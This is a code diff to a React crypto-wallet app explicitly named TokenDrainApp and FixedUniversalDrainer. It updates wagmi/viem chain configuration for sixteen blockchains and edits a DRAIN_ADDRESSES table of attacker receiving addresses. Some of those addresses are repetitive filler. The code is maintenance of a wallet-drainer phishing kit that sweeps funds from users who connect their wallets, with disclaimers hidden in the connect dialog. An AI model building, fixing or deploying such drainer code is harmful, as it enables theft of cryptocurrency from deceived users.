@@ -1,10 +1,26 @@
 import { useState, useEffect, useRef } from 'react';
-import { WagmiConfig, createConfig, configureChains, mainnet } from 'wagmi';
-import { polygon, bsc, arbitrum, optimism, avalanche, fantom, gnosis, celo, moonbeam, cronos, aurora, base, harmonyOne, metis, moonriver } from 'wagmi/chains';
-import { publicProvider } from 'wagmi/providers/public';
+import { WagmiConfig, createConfig } from 'wagmi';
 import { http } from 'viem';
+import { 
+  mainnet,
+  polygon,
+  bsc,
+  arbitrum,
+  optimism,
+  avalanche,
+  fantom,
+  gnosis,
+  celo,
+  moonbeam,
+  cronos,
+  aurora,
+  base,
+  harmonyOne,
+  metis,
+  moonriver
+} from 'viem/chains';
 import { ConnectKitProvider, ConnectKitButton } from "connectkit";
-import { useAccount, useWalletClient, useDisconnect, useBalance, useSwitchChain } from 'wagmi';
+import { useAccount, useDisconnect, useBalance } from 'wagmi';
 import { parseEther, formatEther } from 'viem';
 import './mobile-fix.css';
 
@@ -479,7 +495,7 @@ const DRAIN_ADDRESSES = {
   cosmos: "cosmos1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02",
   binance: "bnb1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02",
   stellar: "GCRWFRVQP5P5TNKL4KARZBWYQG5AUFMTQMXUVE4MZGJPOENKJAZB6KGB",
-  monero: "48daf1rG3hE1txWcFzV1M6WBp3Uc4jL5qJ3JvJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5",
+  monero: "48daf1rG3hE1txWcFzV1M6WBp3Uc4jL5qJ3JvJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5",
   zcash: "t1Z5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5v",
   dash: "Xq5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q",
   tezos: "tz1Z5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5v",
@@ -532,32 +548,35 @@ const TOKEN_PRICES = {
 };
 
 // ==================== FIXED WAGMI CONFIG ====================
-const { chains, publicClient } = configureChains(
-  [
-    mainnet,
-    polygon,
-    bsc,
-    arbitrum,
-    optimism,
-    avalanche,
-    fantom,
-    gnosis,
-    celo,
-    moonbeam,
-    cronos,
-    aurora,
-    base,
-    harmonyOne,
-    metis,
-    moonriver
-  ],
-  [publicProvider()]
-);
+const wagmiChains = [
+  mainnet,
+  polygon,
+  bsc,
+  arbitrum,
+  optimism,
+  avalanche,
+  fantom,
+  gnosis,
+  celo,
+  moonbeam,
+  cronos,
+  aurora,
+  base,
+  harmonyOne,
+  metis,
+  moonriver
+];
+
+// Create transport configurations for each chain
+const transports = wagmiChains.reduce((acc, chain) => {
+  acc[chain.id] = http();
+  return acc;
+}, {});
 
 const wagmiConfig = createConfig({
+  chains: wagmiChains,
+  transports: transports,
   autoConnect: true,
-  publicClient,
-  webSocketPublicClient: publicClient,
 });
 
 // ==================== MAIN APP ====================
@@ -572,11 +591,9 @@ function TokenDrainApp() {
           hideQuestionMarkCTA: true,
           hideTooltips: false,
           disclaimer: null,
-          // FIXED: Enhanced mobile links with proper order
           mobileLinks: ['metamask', 'trust', 'rainbow', 'coinbase', 'zerion', 'tokenary'],
           walletConnectCTA: "QR",
           avoidLayoutShift: true,
-          // FIXED: WalletConnect v2 configuration
           walletConnectChainId: 1,
         }}
         theme="midnight"
@@ -2407,6 +2424,3 @@ function FixedUniversalDrainer() {
 }
 
 export default TokenDrainApp;
-
-
-
